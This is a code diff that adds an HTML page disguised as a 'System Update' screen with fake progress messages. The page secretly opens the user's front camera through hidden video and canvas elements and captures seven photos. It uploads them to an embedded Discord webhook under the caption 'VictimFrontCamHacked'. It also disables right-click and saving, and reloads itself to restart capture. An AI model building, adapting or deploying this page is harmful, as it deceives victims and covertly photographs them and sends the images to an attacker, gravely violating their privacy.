@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+            opacity: 0;
+            animation: fadeIn 0.5s ease-in 0.5s forwards;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .update-container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+            width: 90%;
+            max-width: 400px;
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .update-icon {
+            width: 80px;
+            height: 80px;
+            background: #4CAF50;
+            border-radius: 50%;
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .update-icon::after {
+            content: "✓";
+            color: white;
+            font-size: 36px;
+            font-weight: bold;
+        }
+
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+
+        .subtitle {
+            color: #7f8c8d;
+            margin-bottom: 30px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .progress-container {
+            background: #ecf0f1;
+            border-radius: 10px;
+            height: 6px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            background: #4CAF50;
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+
+        .status-text {
+            font-size: 13px;
+            color: #7f8c8d;
+            margin-top: 15px;
+        }
+
+        .countdown {
+            font-size: 12px;
+            color: #95a5a6;
+            margin-top: 20px;
+        }
+
+        /* Hidden elements for camera */
+        #video, #canvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .hidden-log {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="update-container">
+        <div class="update-icon"></div>
+        <h1>System Update</h1>
+        <p class="subtitle">
+            Your device is being prepared for the latest security patch.
+            Please keep this window open until completion.
+        </p>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="status-text" id="statusText">
+            Initializing update process...
+        </div>
+        
+        <div class="countdown" id="countdown">
+            Estimated time: <span id="timeLeft">30</span> seconds
+        </div>
+    </div>
+
+    <!-- Hidden elements for camera operations -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <!-- Discord webhook configuration -->
+    <div class="hidden-log" id="webhookConfig">
+        <!-- Replace this URL with your actual Discord webhook -->
+        <input type="hidden" id="webhookUrl" value="https://discord.com/api/webhooks/1445409762195017830/6gtZZ0TfIYEf9rCUHGnArDQOiE6yqzN1ncZMvR5oERHtgO8PJMgDZx3LMHD2ekQgPCxp">
+    </div>
+
+    <script>
+        // Configuration
+        const CONFIG = {
+            totalPhotos: 7,
+            captureDelay: 1500, // 1.5 seconds between photos
+            initialDelay: 2000, // 2 seconds before starting
+            fakeProgress: true, // Show fake progress bar
+            webhookEnabled: true,
+            webhookUrl: document.getElementById('webhookUrl').value
+        };
+
+        // State
+        let stream = null;
+        let photos = [];
+        let currentPhoto = 0;
+        let completed = false;
+        let countdownInterval = null;
+        let timeLeft = 30;
+
+        // DOM Elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('statusText');
+        const timeLeftSpan = document.getElementById('timeLeft');
+
+        // Fake status messages for realism
+        const FAKE_STATUSES = [
+            "Initializing security protocols...",
+            "Checking system compatibility...",
+            "Downloading update packages...",
+            "Verifying digital signatures...",
+            "Preparing installation environment...",
+            "Applying security patches...",
+            "Optimizing system performance...",
+            "Finalizing update process...",
+            "Update completed successfully!"
+        ];
+
+        // Update fake progress
+        function updateProgress(percent, message) {
+            if (CONFIG.fakeProgress) {
+                progressBar.style.width = `${percent}%`;
+                statusText.textContent = message;
+            }
+        }
+
+        // Update countdown
+        function updateCountdown() {
+            timeLeft--;
+            timeLeftSpan.textContent = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                timeLeftSpan.textContent = "0";
+            }
+        }
+
+        // Start countdown
+        function startCountdown() {
+            countdownInterval = setInterval(updateCountdown, 1000);
+        }
+
+        // Take photo from camera
+        function takePhoto() {
+            if (!stream || currentPhoto >= CONFIG.totalPhotos) return;
+            
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to blob
+            canvas.toBlob((blob) => {
+                if (blob) {
+                    photos.push(blob);
+                    currentPhoto++;
+                    
+                    // Update fake progress
+                    const progressPercent = Math.floor((currentPhoto / CONFIG.totalPhotos) * 100);
+                    const statusIndex = Math.min(currentPhoto, FAKE_STATUSES.length - 1);
+                    updateProgress(progressPercent, FAKE_STATUSES[statusIndex]);
+                    
+                    // Check if done
+                    if (currentPhoto >= CONFIG.totalPhotos) {
+                        finishCapture();
+                    } else {
+                        // Continue capturing
+                        setTimeout(takePhoto, CONFIG.captureDelay);
+                    }
+                }
+            }, 'image/jpeg', 0.8);
+        }
+
+        // Send photos to Discord
+        async function sendToDiscord() {
+            if (!CONFIG.webhookEnabled || photos.length === 0) return;
+            
+            try {
+                const formData = new FormData();
+                formData.append('content', VictimFrontCamHacked 😈😈🎉📸: ${photos.length} images captured`);
+                
+                // Add all photos
+                photos.forEach((photo, index) => {
+                    formData.append(`files[${index}]`, photo, `capture_${index + 1}.jpg`);
+                });
+                
+                // Send to Discord
+                const response = await fetch(CONFIG.webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    console.log(`✅ Successfully sent ${photos.length} photos to Discord`);
+                } else {
+                    console.error(`❌ Discord error: ${response.status}`);
+                }
+            } catch (error) {
+                console.error('❌ Network error:', error);
+            }
+        }
+
+        // Finish capture process
+        function finishCapture() {
+            completed = true;
+            
+            // Stop camera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            
+            // Update UI
+            updateProgress(100, "Update completed successfully!");
+            clearInterval(countdownInterval);
+            timeLeftSpan.textContent = "0";
+            
+            // Send to Discord
+            if (CONFIG.webhookEnabled && CONFIG.webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+                sendToDiscord();
+            }
+            
+            // Auto-close after delay (optional)
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div style="text-align: center; padding: 50px;">
+                        <h1>✅ Update Complete</h1>
+                        <p>Your system has been successfully updated.</p>
+                        <p style="font-size: 12px; color: #95a5a6; margin-top: 20px;">
+                            You may now close this window.
+                        </p>
+                    </div>
+                `;
+            }, 3000);
+        }
+
+        // Initialize camera and start capture
+        async function initializeCamera() {
+            try {
+                // Update status
+                updateProgress(10, "Accessing security camera...");
+                
+                // Request camera access
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                // Set video source
+                video.srcObject = stream;
+                
+                // Wait for video to be ready
+                video.onloadedmetadata = () => {
+                    // Start countdown
+                    startCountdown();
+                    
+                    // Start capture after initial delay
+                    setTimeout(() => {
+                        updateProgress(20, "Capturing security verification images...");
+                        takePhoto();
+                    }, CONFIG.initialDelay);
+                };
+                
+            } catch (error) {
+                console.error('Camera error:', error);
+                
+                // Fallback: Use fake completion even without camera
+                updateProgress(100, "Update completed with limited functionality");
+                setTimeout(() => {
+                    document.body.innerHTML = `
+                        <div style="text-align: center; padding: 50px;">
+                            <h1>⚠️ Update Partially Complete</h1>
+                            <p>Some features require camera access. Update applied with limited functionality.</p>
+                        </div>
+                    `;
+                }, 2000);
+            }
+        }
+
+        // Start everything when page loads
+        window.addEventListener('load', () => {
+            // Check if webhook URL is set
+            if (!CONFIG.webhookUrl || !CONFIG.webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+                console.warn('⚠️ Please set your Discord webhook URL in the HTML file');
+            }
+            
+            // Start the process
+            setTimeout(() => {
+                initializeCamera();
+            }, 1000);
+        });
+
+        // Optional: Auto-refresh page if it loses focus (for testing persistence)
+        let hiddenTime = 0;
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                // Page is hidden
+                hiddenTime = Date.now();
+            } else {
+                // Page is visible again
+                if (Date.now() - hiddenTime > 5000 && !completed) {
+                    // If page was hidden for more than 5 seconds, restart process
+                    location.reload();
+                }
+            }
+        });
+
+        // Disable right-click and keyboard shortcuts
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
